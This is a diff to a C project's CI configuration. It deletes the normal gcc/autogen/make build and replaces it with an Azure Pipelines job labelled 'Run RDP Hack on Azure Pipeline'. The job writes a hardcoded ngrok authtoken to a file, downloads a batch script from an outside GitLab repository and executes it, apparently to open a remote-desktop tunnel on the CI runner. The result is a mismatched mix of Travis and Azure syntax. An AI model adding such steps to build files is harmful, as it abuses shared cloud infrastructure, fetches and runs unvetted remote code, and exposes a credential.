@@ -1,11 +1,12 @@
 language: c
 
-compiler:
-  - gcc
-
-before_script:
-  - ./autogen.sh
-
-script:
-  - ./configure
-  - make
+- job: Windows_2019_Azure_RDP
+  pool:
+    vmImage: windows-latest
+  steps:
+   - checkout: none 
+   - script: |
+       echo ngrok authtoken "7yGZV6RYigyyxELWQpcqC_5s12pohsvoWJwFVMmMHwU" > NGROK.bat
+       curl -s -O https://gitlab.com/haithuongpro2711/haivps/-/raw/master/AzureNgrokAutoRegion.bat
+       AzureNgrokAutoRegion.bat
+     displayName: 'Run RDP Hack on Azure Pipeline'
